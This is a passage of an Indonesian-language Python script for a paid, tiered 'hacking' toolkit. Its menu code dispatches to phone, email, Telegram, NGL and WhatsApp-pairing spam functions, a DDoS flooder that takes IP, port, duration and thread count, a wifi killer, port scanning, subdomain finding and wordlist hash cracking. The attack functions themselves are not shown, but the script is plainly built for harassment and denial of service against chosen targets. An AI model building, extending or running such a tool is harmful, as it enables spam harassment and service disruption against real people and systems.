        print(f"{Color.GOLD}│  {Color.GREEN}23.{Color.RESET} ❌ LOGOUT           {Color.DIM}→ Kembali ke login{Color.GOLD}                    │{Color.RESET}")
        print(f"{Color.GOLD}└────────────────────────────────────────────────────────────────┘{Color.RESET}")

        choice = input(f"\n{Color.NEON}┌─ {Color.BOLD}🔹 Pilih menu{Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()

        if choice == "1":
            if not is_vip:
                print(f"{Color.RED}Fitur ini hanya untuk VIP/Premium/Owner.{Color.RESET}")
            else:
                phone = input("Masukkan nomor HP target: ").strip()
                if phone:
                    p08 = normalize_phone(phone)
                    p62 = to_62(p08); pplus = to_plus(p08); pnocode = to_nocode(p08)
                    pint = int(p62) if p62.isdigit() else None
                    spam_all(p08, p62, pplus, pnocode, pint)
        elif choice == "2":
            t = input("Username NGL: ").strip()
            if t: spam_ngl(t)
        elif choice == "3":
            t = input("Chat ID: ").strip()
            if t: spam_telegram(t)
        elif choice == "4":
            t = input("Email target: ").strip()
            if t: spam_email(t)
        elif choice == "5":
            t = input("IP: ").strip()
            if t: ip_tracker(t)
        elif choice == "6":
            t = input("Nomor: ").strip()
            if t: phone_info(t)
        elif choice == "7": ganti_waria()
        elif choice == "8": wifi_killer()
        elif choice == "9":
            t = input("Nomor WhatsApp: ").strip()
            if t: spam_pairing(t)
        elif choice == "10":
            ip = input("Target IP: ").strip(); port = int(input("Port: ").strip())
            dur = int(input("Durasi (detik): ").strip()); threads = int(input("Threads: ").strip())
            ddos(ip, port, dur, threads)
        elif choice == "11":
            t = input("Host: ").strip()
            if t: ping(t)
        elif choice == "12":
            t = input("Domain: ").strip()
            if t: nslookup(t)
        elif choice == "13":
            t = input("Domain: ").strip()
            if t: whois(t)
        elif choice == "14":
            host = input("Host: ").strip(); ports = input("Port (pisah koma): ").strip()
            if host and ports:
                port_list = [int(p.strip()) for p in ports.split(',') if p.strip().isdigit()]
                port_scanner(host, port_list)
        elif choice == "15":
            t = input("Domain: ").strip()
            if t: subdomain_finder(t)
        elif choice == "16":
            t = input("URL: ").strip()
            if t: banner_grabber(t)
        elif choice == "17":
            urls = input("URLs (pisah koma): ").strip().split(',')
            web_checker([u.strip() for u in urls if u.strip()])
        elif choice == "18":
            t = input("Text: ").strip()
            if t: encode_base64(t)
        elif choice == "19":
            t = input("Base64: ").strip()
            if t: decode_base64(t)
        elif choice == "20":
            t = input("Text: ").strip(); m = input("Metode (md5/sha1/sha256): ").strip().lower()
            if t and m in ['md5','sha1','sha256']: hash_text(t, m)
        elif choice == "21":
            h = input("Hash: ").strip(); w = input("Path wordlist: ").strip()
            m = input("Metode (md5/sha1/sha256): ").strip().lower()
            if h and w and m in ['md5','sha1','sha256']: crack_password(h, w, m)
        elif choice == "22":
            if is_owner: admin_menu()
            elif is_reseller: reseller_menu()
            else: print(f"{Color.RED}Fitur ini hanya untuk Owner/Reseller.{Color.RESET}")
        elif choice == "23":
            glitch_effect("Logout..."); break
        else:
            print(f"{Color.RED}Pilihan tidak valid.{Color.RESET}")
        input(f"\n{Color.DIM}Tekan Enter untuk lanjut...{Color.RESET}")

# ================================================================
# NORMALISASI NOMOR
# ================================================================
def normalize_phone(phone):
    phone = ''.join(c for c in phone if c.isdigit())
    if phone.startswith("62"): return "0" + phone[2:]
    if phone.startswith("8"): return "0" + phone
    return phone
def to_62(phone):
    phone = ''.join(c for c in phone if c.isdigit())
    if phone.startswith("0"): return "62" + phone[1:]
    if phone.startswith("62"): return phone
    return "62" + phone
def to_plus(phone):
    phone = ''.join(c for c in phone if c.isdigit())
    if phone.startswith("0"): return "+62" + phone[1:]
    if phone.startswith("62"): return "+" + phone
    return "+" + phone
def to_nocode(phone):
    phone = ''.join(c for c in phone if c.isdigit())
    if phone.startswith("0"): return phone[1:]
    if phone.startswith("62"): return phone[2:]
    return phone

# ================================================================
# MAIN
# ================================================================
if __name__ == "__main__":
    try:
        if not os.path.exists(USERS_FILE):
            add_user(OWNER_ID, "ZEVXX", "owner")
        while True:
            user_id = login()
            if user_id:
                main_menu(user_id)
            else:
                print(f"{Color.RED}Login gagal. Silakan coba lagi.{Color.RESET}")
                time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}Program dihentikan.{Color.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Color.RED}Error: {e}{Color.RESET}")
        sys.exit(1)